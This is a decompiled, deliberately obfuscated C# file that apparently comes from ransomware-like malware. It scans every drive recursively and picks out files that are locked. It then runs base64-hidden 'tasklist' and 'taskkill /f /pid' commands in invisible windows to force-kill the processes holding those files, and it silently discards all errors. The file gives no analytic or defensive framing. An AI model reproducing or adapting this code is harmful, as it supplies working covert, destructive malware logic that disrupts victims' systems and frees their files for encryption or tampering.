using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;

namespace oEqFtKwIikP;

internal class jmBcImfTEkDAKE
{
	[CompilerGenerated]
	private sealed class MityJMakdmC
	{
		public string fVfFesAtsaKb;

		public bool _003CKillproc_003Eb__4(string t)
		{
			return t.Contains(fVfFesAtsaKb);
		}
	}

	public static readonly List<string> GGylJqMifooOgJG = new List<string>();

	public static readonly List<string> otvXzNOIsFtTna = new List<string>();

	public static void ukvGWyLoYQzXb()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					CsOUlgEHAeBs(driveInfo.Name);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static void CsOUlgEHAeBs(string eVHRcdhgsfNyv)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(eVHRcdhgsfNyv);
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					GGylJqMifooOgJG.Add(fileInfo.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				try
				{
					CsOUlgEHAeBs(directoryInfo2.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
		}
		catch
		{
		}
		if (GGylJqMifooOgJG.Count <= 0)
		{
			return;
		}
		foreach (string item in GGylJqMifooOgJG.Where((string vrEOGBiVcSdwn) => xPOFMJanBPGOSC(vrEOGBiVcSdwn)))
		{
			otvXzNOIsFtTna.Add(item);
		}
		GGylJqMifooOgJG.Clear();
		if (otvXzNOIsFtTna.Count <= 0)
		{
			return;
		}
		foreach (FileInfo item2 in otvXzNOIsFtTna.Select((string vnLnzFQAnGgf) => new FileInfo(vnLnzFQAnGgf)))
		{
			DxWOrEkBWxMLn(item2.Name);
		}
	}

	public static bool xPOFMJanBPGOSC(string igFonkKWgYL)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(igFonkKWgYL, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(igFonkKWgYL, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream.Close();
		}
		return false;
	}

	public static void DxWOrEkBWxMLn(string vjskGEGLwbLY)
	{
		try
		{
			string text = bwBoUKGLqtOO(ieyWohRMXsyos.tEHBqPAYINDcv("dGFza2xpc3Q="), ieyWohRMXsyos.tEHBqPAYINDcv("L3YgL2ZvIGNzdg=="));
			string[] separator = new string[1] { "\r\n" };
			string[] source = text.Split(separator, StringSplitOptions.None);
			List<string> list = (from t in source
				where t.Contains(vjskGEGLwbLY)
				select t into TzbIUcAcLkeBujIJpf
				select TzbIUcAcLkeBujIJpf.Split(new char[1] { ',' }) into nldClrAeIxLX
				select nldClrAeIxLX[1].Replace("\"", "")).ToList();
			foreach (string item in list)
			{
				bwBoUKGLqtOO(ieyWohRMXsyos.tEHBqPAYINDcv("dGFza2tpbGw="), ieyWohRMXsyos.tEHBqPAYINDcv("L2YgL3BpZCA=") + item);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string bwBoUKGLqtOO(string KwmgWhiCdT, string dTKWEwjJbyQEAj)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(KwmgWhiCdT, dTKWEwjJbyQEAj);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			string text;
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			string text2;
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			process.WaitForExit();
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + "\n<------------>\n" + ex.StackTrace;
		}
	}
}
